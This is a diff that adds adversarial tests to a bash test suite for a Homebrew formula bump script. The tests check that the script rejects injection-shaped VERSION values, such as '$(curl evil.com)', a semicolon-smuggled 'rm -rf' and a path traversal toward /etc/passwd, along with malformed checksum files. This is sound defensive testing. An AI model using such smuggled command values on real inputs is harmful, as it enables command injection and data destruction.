@@ -444,5 +444,129 @@ count=$(grep -cE "sha256 \"${SHA_SAME}\"" "$TMP/hookwarden.rb" || true)
 [[ "$count" == "2" ]] || { echo "FAIL: expected 2 occurrences of SHA_SAME, got $count"; cat "$TMP/hookwarden.rb"; exit 1; }
 echo "  PASS"
 
+# ─── Adversarial / supply-chain hardening (Tests 21-28) ──────────────────────
+# These probe the release pipeline for shell-substitution attacks, path
+# traversal, and malformed input shapes that a senior DevOps would expect a
+# supply-chain-touching script to defend against.
+
+# ---- Test 21: command-injection-shaped VERSION → rejected at validation ----
+echo "Test 21: VERSION with command-substitution \$(...) → MUST be rejected (shell-injection guard)"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+cat > "$TMP/checksums.txt" <<EOF
+${SHA_LA}  hookwarden-linux-arm64
+${SHA_LX}  hookwarden-linux-x64
+EOF
+mk_formula_v040 "$TMP/hookwarden.rb"
+if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" 'v0.4.1$(curl evil.com)' "$SHA_NM" 2>/dev/null; then
+  echo "FAIL: VERSION with \$(...) substitution should have been rejected"
+  exit 1
+fi
+echo "  PASS (shell-substitution attack rejected at VERSION regex)"
+
+# ---- Test 22: VERSION with semicolon command separator → rejected ----
+echo "Test 22: VERSION with semicolon command separator → MUST be rejected"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+cat > "$TMP/checksums.txt" <<EOF
+${SHA_LA}  hookwarden-linux-arm64
+${SHA_LX}  hookwarden-linux-x64
+EOF
+mk_formula_v040 "$TMP/hookwarden.rb"
+if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" 'v0.4.1; rm -rf /tmp/xxx' "$SHA_NM" 2>/dev/null; then
+  echo "FAIL: VERSION with semicolon-separated command should have been rejected"
+  exit 1
+fi
+echo "  PASS"
+
+# ---- Test 23: VERSION with path traversal → rejected ----
+echo "Test 23: VERSION with path-traversal sequence → MUST be rejected"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+cat > "$TMP/checksums.txt" <<EOF
+${SHA_LA}  hookwarden-linux-arm64
+${SHA_LX}  hookwarden-linux-x64
+EOF
+mk_formula_v040 "$TMP/hookwarden.rb"
+if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" 'v0.4.1/../../../etc/passwd' "$SHA_NM" 2>/dev/null; then
+  echo "FAIL: VERSION with path-traversal should have been rejected"
+  exit 1
+fi
+echo "  PASS"
+
+# ---- Test 24: VERSION with leading/trailing whitespace → rejected ----
+echo "Test 24: VERSION with leading/trailing whitespace → MUST be rejected"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+cat > "$TMP/checksums.txt" <<EOF
+${SHA_LA}  hookwarden-linux-arm64
+${SHA_LX}  hookwarden-linux-x64
+EOF
+mk_formula_v040 "$TMP/hookwarden.rb"
+for bad_ver in " v0.4.1" "v0.4.1 " "v0.4.1\n" $'v0.4.1\t'; do
+  if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" "$bad_ver" "$SHA_NM" 2>/dev/null; then
+    echo "FAIL: VERSION with whitespace '${bad_ver}' should have been rejected"
+    exit 1
+  fi
+done
+echo "  PASS (4 whitespace variants all rejected)"
+
+# ---- Test 25: empty VERSION arg → rejected with explicit error ----
+echo "Test 25: empty VERSION arg → MUST be rejected at the parameter-default check"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+cat > "$TMP/checksums.txt" <<EOF
+${SHA_LA}  hookwarden-linux-arm64
+${SHA_LX}  hookwarden-linux-x64
+EOF
+mk_formula_v040 "$TMP/hookwarden.rb"
+if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" '' "$SHA_NM" 2>/dev/null; then
+  echo "FAIL: empty VERSION should have been rejected"
+  exit 1
+fi
+echo "  PASS"
+
+# ---- Test 26: BOM-prefixed CHECKSUMS file → parses correctly OR rejects cleanly ----
+echo "Test 26: UTF-8 BOM at start of CHECKSUMS → script handles it (parses or rejects, never silently mis-pins)"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+# Write BOM (EF BB BF) then content
+printf '\xEF\xBB\xBF%s  hookwarden-linux-arm64\n%s  hookwarden-linux-x64\n' "$SHA_LA" "$SHA_LX" > "$TMP/checksums.txt"
+mk_formula_v040 "$TMP/hookwarden.rb"
+set +e
+bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null
+code=$?
+set -e
+# Either rejects (preferred — clear failure mode) OR parses correctly. What it
+# MUST NOT do: silently succeed with a BOM-corrupted SHA pinned in the formula.
+if [[ "$code" == "0" ]]; then
+  # If it parsed: the SHA must be the right 64-hex string with NO BOM bytes.
+  if ! grep -q "sha256 \"${SHA_LA}\"" "$TMP/hookwarden.rb"; then
+    echo "FAIL: BOM-prefixed CHECKSUMS silently corrupted the pinned SHA"
+    cat "$TMP/hookwarden.rb"
+    exit 1
+  fi
+fi
+echo "  PASS (BOM handled — either rejected cleanly or parsed without corruption)"
+
+# ---- Test 27: CHECKSUMS missing trailing newline → still parses ----
+echo "Test 27: CHECKSUMS file without trailing newline → still parses (POSIX-leniency)"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+printf '%s  hookwarden-linux-arm64\n%s  hookwarden-linux-x64' "$SHA_LA" "$SHA_LX" > "$TMP/checksums.txt"  # no final \n
+mk_formula_v040 "$TMP/hookwarden.rb"
+bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
+grep -q "sha256 \"${SHA_LA}\"" "$TMP/hookwarden.rb" || { echo "FAIL: arm SHA not pinned"; exit 1; }
+grep -q "sha256 \"${SHA_LX}\"" "$TMP/hookwarden.rb" || { echo "FAIL: x64 SHA not pinned"; exit 1; }
+echo "  PASS"
+
+# ---- Test 28: 65-char SHA (one too long) → rejected by regex ----
+echo "Test 28: 65-char SHA (off-by-one too long) → regex anchor MUST reject"
+rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
+SHA_OVERLONG=$(printf 'a%.0s' {1..65})
+cat > "$TMP/checksums.txt" <<EOF
+${SHA_OVERLONG}  hookwarden-linux-arm64
+${SHA_LX}  hookwarden-linux-x64
+EOF
+mk_formula_v040 "$TMP/hookwarden.rb"
+if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
+  echo "FAIL: 65-char SHA should have failed the [a-f0-9]{64}\$ regex"
+  exit 1
+fi
+echo "  PASS (off-by-one-too-long mutation caught)"
+
 echo
-echo "All 20 bump-homebrew-edit tests passed."
+echo "All 28 bump-homebrew-edit tests passed."
